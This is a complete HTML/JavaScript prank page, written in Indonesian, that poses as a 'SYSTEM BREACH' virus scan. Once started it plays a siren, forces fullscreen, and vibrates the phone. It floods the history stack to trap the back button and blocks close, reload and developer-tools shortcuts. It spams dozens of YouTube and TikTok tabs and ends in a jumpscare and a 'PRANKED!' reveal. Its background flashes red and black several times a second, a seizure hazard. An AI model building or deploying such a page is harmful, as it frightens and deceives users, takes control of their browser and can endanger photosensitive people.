<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚠️ SYSTEM BREACH ⚠️</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    user-select: none;
    -webkit-user-select: none;
  }

  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    font-family: 'Courier New', monospace;
    background: #000;
    cursor: crosshair;
  }

  #stage {
    width: 100vw;
    height: 100vh;
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
  }

  /* Background kedap-kedip SUPER cepat */
  .flash {
    position: absolute;
    inset: 0;
    background: #ff0000;
    animation: flashBg 0.18s infinite;
    z-index: 1;
  }

  @keyframes flashBg {
    0%, 49% { background: #ff0000; }
    50%, 100% { background: #000000; }
  }

  .content {
    position: relative;
    z-index: 2;
    padding: 20px;
    max-width: 95vw;
    max-height: 95vh;
    overflow: hidden;
  }

  .skull {
    font-size: 90px;
    animation: shake 0.12s infinite, glow 0.3s infinite alternate;
    filter: drop-shadow(0 0 30px red);
    line-height: 1;
  }

  @keyframes shake {
    0%, 100% { transform: translate(0, 0) rotate(0deg); }
    25% { transform: translate(-6px, 4px) rotate(-4deg); }
    50% { transform: translate(6px, -4px) rotate(4deg); }
    75% { transform: translate(-4px, -6px) rotate(-3deg); }
  }

  @keyframes glow {
    from { filter: drop-shadow(0 0 20px red); }
    to { filter: drop-shadow(0 0 90px #ff0000); }
  }

  .title {
    font-size: 52px;
    color: #fff;
    text-shadow: 0 0 20px red, 0 0 40px red, 0 0 80px red;
    letter-spacing: 6px;
    margin: 8px 0;
    animation: titleShake 0.15s infinite;
    font-weight: bold;
  }

  @keyframes titleShake {
    0%, 100% { transform: translate(0, 0); }
    50% { transform: translate(3px, -3px); }
  }

  .msg {
    font-size: 20px;
    color: #ffff00;
    text-shadow: 0 0 15px yellow;
    margin: 12px 0;
    animation: blink 0.4s infinite;
    font-weight: bold;
  }

  @keyframes blink {
    50% { opacity: 0; }
  }

  .countdown {
    font-size: 110px;
    font-weight: bold;
    color: #ff0000;
    text-shadow: 0 0 30px red, 0 0 60px red;
    margin: 8px 0;
    animation: pulse 0.4s infinite;
    min-height: 130px;
    line-height: 1;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.18); }
  }

  .stats {
    font-size: 22px;
    color: #ff6666;
    margin: 15px 0;
    text-shadow: 0 0 10px red;
  }

  .stats p {
    margin: 6px 0;
  }

  .stats span {
    color: #fff;
    font-weight: bold;
    font-size: 26px;
  }

  .start-btn {
    margin-top: 15px;
    padding: 18px 45px;
    font-size: 22px;
    font-weight: bold;
    background: #ff0000;
    color: #fff;
    border: 4px solid #fff;
    border-radius: 10px;
    cursor: pointer;
    font-family: 'Courier New', monospace;
    animation: btnPulse 0.5s infinite;
    letter-spacing: 3px;
    transition: all 0.2s;
  }

  .start-btn:hover {
    background: #fff;
    color: #ff0000;
    transform: scale(1.1);
  }

  @keyframes btnPulse {
    0%, 100% { box-shadow: 0 0 20px red; }
    50% { box-shadow: 0 0 60px red; }
  }

  .warn {
    font-size: 14px;
    color: #ff0000;
    margin-top: 15px;
    animation: blink 0.3s infinite;
    letter-spacing: 4px;
  }

  /* Iframe fallback kalau popup diblokir */
  #iframeContainer {
    position: fixed;
    inset: 0;
    z-index: 9998;
    display: none;
    pointer-events: none;
  }

  .fakeIframe {
    position: absolute;
    width: 300px;
    height: 170px;
    border: 3px solid #fff;
    background: #111;
    overflow: hidden;
    box-shadow: 0 0 25px rgba(255,0,0,0.9);
    animation: popIn 0.3s;
    pointer-events: auto;
    border-radius: 6px;
  }

  .fakeIframe .close-x {
    position: absolute;
    top: 4px;
    right: 6px;
    color: #fff;
    background: #000;
    padding: 2px 8px;
    cursor: pointer;
    font-weight: bold;
    z-index: 10;
    border-radius: 4px;
    font-size: 14px;
    border: 1px solid #fff;
  }

  .fakeIframe .close-x:hover {
    background: #ff0000;
  }

  @keyframes popIn {
    0% { transform: scale(0) rotate(-15deg); opacity: 0; }
    70% { transform: scale(1.15) rotate(3deg); opacity: 1; }
    100% { transform: scale(1) rotate(0deg); }
  }

  /* Jumpscare */
  .jumpscare {
    position: fixed;
    inset: 0;
    background: #fff;
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 99999;
    font-size: 250px;
    animation: jumpAnim 0.08s infinite;
    line-height: 1;
  }

  @keyframes jumpAnim {
    0%, 100% { transform: scale(1) rotate(0deg); }
    50% { transform: scale(1.2) rotate(8deg); }
  }

  /* Ending */
  .ending {
    position: fixed;
    inset: 0;
    background: #000;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 99999;
    color: #00ff00;
    text-align: center;
    cursor: default;
    padding: 20px;
    animation: fadeIn 0.5s;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  /* Scrollbar hide */
  ::-webkit-scrollbar { display: none; }
  body { -ms-overflow-style: none; scrollbar-width: none; }
</style>
</head>
<body>
  <div id="stage">
    <div class="flash"></div>
    <div class="content">
      <div class="skull">💀</div>
      <h1 class="title">SYSTEM BREACH</h1>
      <p class="msg" id="msg">⚠️ KLIK UNTUK MEMULAI PEMINDAIAN ⚠️</p>
      <div class="countdown" id="cd">--</div>

      <div class="stats">
        <p>📺 YouTube: <span id="ytCount">0</span>/20</p>
        <p>🎵 TikTok: <span id="ttCount">0</span>/20</p>
      </div>

      <button id="startBtn" class="start-btn">▶ MULAI SCAN</button>
      <p class="warn">JANGAN TUTUP HALAMAN INI</p>
    </div>
  </div>

  <div id="iframeContainer"></div>

<script>
// ============================================
// KONFIGURASI
// ============================================
const TOTAL_TABS = 20;
const YT_URLS = [
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://www.youtube.com/watch?v=9bZkp7q19f0',
  'https://www.youtube.com/results?search_query=prank',
  'https://www.youtube.com/results?search_query=funny+cat',
  'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
];

const TT_URLS = [
  'https://www.tiktok.com/',
  'https://www.tiktok.com/foryou',
  'https://www.tiktok.com/search?q=prank',
  'https://www.tiktok.com/search?q=funny',
  'https://www.tiktok.com/explore',
];

let ytCount = 0;
let ttCount = 0;

// ============================================
// 1. SIRENE ALARM
// ============================================
let audioCtx, sirenOsc, sirenGain, sirenLFO, sirenGainLFO;

function startSirene() {
  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();

    sirenOsc = audioCtx.createOscillator();
    sirenOsc.type = 'sawtooth';
    sirenOsc.frequency.value = 700;

    sirenGain = audioCtx.createGain();
    sirenGain.gain.value = 0.1;

    sirenLFO = audioCtx.createOscillator();
    sirenLFO.type = 'sine';
    sirenLFO.frequency.value = 1.5;

    const lfoGain = audioCtx.createGain();
    lfoGain.gain.value = 400;

    sirenGainLFO = audioCtx.createOscillator();
    sirenGainLFO.type = 'square';
    sirenGainLFO.frequency.value = 3;

    const gainLFO = audioCtx.createGain();
    gainLFO.gain.value = 0.07;

    sirenLFO.connect(lfoGain);
    lfoGain.connect(sirenOsc.frequency);
    sirenGainLFO.connect(gainLFO);
    gainLFO.connect(sirenGain.gain);

    sirenOsc.connect(sirenGain);
    sirenGain.connect(audioCtx.destination);

    sirenOsc.start();
    sirenLFO.start();
    sirenGainLFO.start();
  } catch(e) { console.log('Audio error:', e); }
}

function stopSirene() {
  try {
    if (sirenOsc) sirenOsc.stop();
    if (sirenLFO) sirenLFO.stop();
    if (sirenGainLFO) sirenGainLFO.stop();
    if (audioCtx) audioCtx.close();
  } catch(e) {}
}

function beep(freq, dur) {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const g = ctx.createGain();
    osc.frequency.value = freq;
    osc.type = 'square';
    g.gain.value = 0.06;
    osc.connect(g);
    g.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + dur);
  } catch(e) {}
}

// ============================================
// 2. SPAM TAB YOUTUBE & TIKTOK
// ============================================
function openSpamTabs() {
  // YouTube dulu
  const ytInterval = setInterval(() => {
    if (ytCount >= TOTAL_TABS) {
      clearInterval(ytInterval);
      setTimeout(startTikTokSpam, 500);
      return;
    }

    const url = YT_URLS[ytCount % YT_URLS.length];
    try {
      const w = window.open(url, '_blank');
      if (!w || w.closed || typeof w.closed === 'undefined') {
        createFakeIframe(url, 'youtube');
      }
    } catch(e) {
      createFakeIframe(url, 'youtube');
    }

    ytCount++;
    document.getElementById('ytCount').innerText = ytCount;
    beep(1200, 0.05);
  }, 250);
}

function startTikTokSpam() {
  const ttInterval = setInterval(() => {
    if (ttCount >= TOTAL_TABS) {
      clearInterval(ttInterval);
      return;
    }

    const url = TT_URLS[ttCount % TT_URLS.length];
    try {
      const w = window.open(url, '_blank');
      if (!w || w.closed || typeof w.closed === 'undefined') {
        createFakeIframe(url, 'tiktok');
      }
    } catch(e) {
      createFakeIframe(url, 'tiktok');
    }

    ttCount++;
    document.getElementById('ttCount').innerText = ttCount;
    beep(900, 0.05);
  }, 250);
}

// ============================================
// 3. FALLBACK IFRAME PALSU
// ============================================
function createFakeIframe(url, type) {
  const container = document.getElementById('iframeContainer');
  container.style.display = 'block';

  const el = document.createElement('div');
  el.className = 'fakeIframe';

  const maxX = Math.max(0, window.innerWidth - 320);
  const maxY = Math.max(0, window.innerHeight - 190);
  const x = Math.random() * maxX;
  const y = Math.random() * maxY;

  el.style.left = x + 'px';
  el.style.top = y + 'px';
  el.style.zIndex = 9998 + (ytCount + ttCount);

  const icon = type === 'youtube' ? '📺' : '🎵';
  const color = type === 'youtube' ? '#ff0000' : '#000';

  el.innerHTML = `
    <div class="close-x" onclick="this.parentElement.remove();">✕</div>
    <div style="background:${color}; color:#fff; padding:4px 8px; font-size:11px; overflow:hidden; white-space:nowrap;">
      ${icon} ${type.toUpperCase()} - ${url.slice(0, 28)}...
    </div>
    <div style="display:flex; align-items:center; justify-content:center; height:130px; background:#111; color:#fff; font-size:13px; flex-direction:column; gap:8px;">
      <div style="font-size:36px;">${icon}</div>
      <div>Loading ${type}...</div>
    </div>
  `;

  container.appendChild(el);
}

// ============================================
// 4. HISTORY TRAP
// ============================================
function trapHistory() {
  for (let i = 0; i < 100; i++) {
    history.pushState({ trap: i }, '', location.href);
  }

  window.addEventListener('popstate', () => {
    history.pushState({ trap: 'again' }, '', location.href);
    beep(400, 0.1);
  });

  window.addEventListener('keydown', (e) => {
    const blocked =
      e.key === 'F5' ||
      e.key === 'F12' ||
      (e.ctrlKey && ['r','R','w','W','u','U','n','N','t','T','p','P','s','S'].includes(e.key)) ||
      (e.ctrlKey && e.shiftKey && ['I','J','C','R','N','T'].includes(e.key)) ||
      (e.altKey && e.key === 'F4') ||
      (e.altKey && e.key === 'ArrowLeft') ||
      (e.altKey && e.key === 'ArrowRight') ||
      (e.metaKey && ['r','w','q'].includes(e.key));

    if (blocked) {
      e.preventDefault();
      e.stopPropagation();
      beep(300, 0.2);
      return false;
    }
  }, true);

  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('dragstart', e => e.preventDefault());
  document.addEventListener('selectstart', e => e.preventDefault());
}

// ============================================
// 5. GETARAN HP
// ============================================
function vibrateLoop() {
  if (navigator.vibrate) {
    setInterval(() => {
      navigator.vibrate([300, 100, 300, 100, 300]);
    }, 1000);
  }
}

// ============================================
// 6. FULLSCREEN
// ============================================
function goFullscreen() {
  const el = document.documentElement;
  const req = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
  if (req) {
    try { req.call(el).catch(()=>{}); } catch(e) {}
  }
}

// ============================================
// 7. COUNTDOWN + ENDING
// ============================================
function startCountdown() {
  const cd = document.getElementById('cd');
  let n = 20;
  cd.innerText = n;

  const interval = setInterval(() => {
    n--;
    cd.innerText = n;
    beep(n <= 5 ? 1500 : 900, 0.08);

    if (n <= 0) {
      clearInterval(interval);
      showEnding();
    }
  }, 1000);
}

function showEnding() {
  stopSirene();

  // Jumpscare dulu
  const jump = document.createElement('div');
  jump.className = 'jumpscare';
  jump.innerHTML = '👹';
  document.body.appendChild(jump);
  jump.style.display = 'flex';

  beep(150, 0.8);

  setTimeout(() => {
    jump.remove();

    const end = document.createElement('div');
    end.className = 'ending';
    end.style.display = 'flex';
    end.innerHTML = `
      <div style="font-size:120px; line-height:1;">😂</div>
      <h1 style="font-size:65px; color:#00ff00; text-shadow:0 0 30px lime; margin:15px 0; letter-spacing:5px;">PRANKED!</h1>
      <p style="font-size:26px; color:#fff; margin:12px 0;">Tenang bro, ini cuma prank 😎</p>
      <p style="font-size:20px; color:#0f0; margin:8px 0;">Nggak ada virus. Nggak ada yang diretas.</p>
      <p style="font-size:18px; color:#ffaa00; margin-top:15px;">Total tab dibuka: <b>${ytCount + ttCount}</b></p>
      <p style="font-size:16px; color:#888; margin-top:15px;">Tutup aja tab YouTube & TikTok-nya ya~ 😄</p>
      <button onclick="cleanup()" style="margin-top:25px; padding:15px 40px; background:#0f0; color:#000; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; font-family:'Courier New',monospace;">OK, AKU KETIPU 😂</button>
    `;
    document.body.appendChild(end);
    document.body.style.cursor = 'default';
  }, 1500);
}

function cleanup() {
  history.go(-history.length);
  setTimeout(() => location.reload(), 100);
}

// ============================================
// 8. START BUTTON (3x klik biar popup lolos)
// ============================================
let clickCount = 0;
const startBtn = document.getElementById('startBtn');
const msg = document.getElementById('msg');

startBtn.addEventListener('click', function() {
  clickCount++;

  if (clickCount < 3) {
    this.innerText = `⚠ KLIK LAGI (${clickCount}/3) ⚠`;
    beep(600, 0.1);
    msg.innerText = `⚠️ KONFIRMASI ${clickCount}/3 ⚠️`;
    return;
  }

  // Mulai!
  this.style.display = 'none';
  msg.innerText = '⚠️ MEMINDAI SISTEM... ⚠️';

  startSirene();
  trapHistory();
  goFullscreen();
  vibrateLoop();
  startCountdown();

  setTimeout(() => {
    openSpamTabs();
  }, 1000);
});

// Prevent scroll
window.addEventListener('wheel', e => e.preventDefault(), { passive: false });
window.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
</script>
</body>
</html>
